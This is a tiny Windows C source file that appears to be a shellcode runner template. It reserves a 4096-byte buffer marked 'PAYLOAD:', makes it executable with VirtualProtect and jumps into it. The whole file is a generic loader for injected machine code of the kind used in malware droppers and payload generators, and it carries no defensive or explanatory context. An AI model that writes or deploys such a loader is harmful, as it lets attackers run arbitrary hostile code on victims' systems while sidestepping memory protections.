#include <windows.h>

#define SCSIZE 4096
char bPayload[SCSIZE] = "PAYLOAD:";

void main() {
	DWORD dwOldProtect;
	VirtualProtect(bPayload, SCSIZE, PAGE_EXECUTE_READWRITE, &dwOldProtect);
	(*(void (*)()) bPayload)();
	return;
}
